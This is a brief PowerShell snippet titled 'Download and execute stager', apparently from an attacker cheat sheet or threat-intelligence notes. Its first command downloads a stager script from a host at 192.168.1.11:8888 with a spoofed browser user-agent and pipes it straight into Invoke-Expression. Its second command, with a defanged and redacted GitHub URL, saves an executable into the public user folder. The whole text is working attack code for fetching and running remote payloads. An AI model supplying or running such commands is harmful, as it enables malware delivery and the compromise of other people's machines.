# Download and execute stager
$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'; $wc.Header.Add('User-Agent',$u);$wc.Proxy = [System.Net.WebRequest]::DefaultNetworkCredentials;$wc.DownloadString('http://192.168.1.11:8888/stager.ps1') | IEX

powershell (new-object System.Net.WebClient).DownloadFile('hXXps://github[.]com/[REDACTED]/test/raw/master/ms.exe','c:\\users\\public\\2.exe')
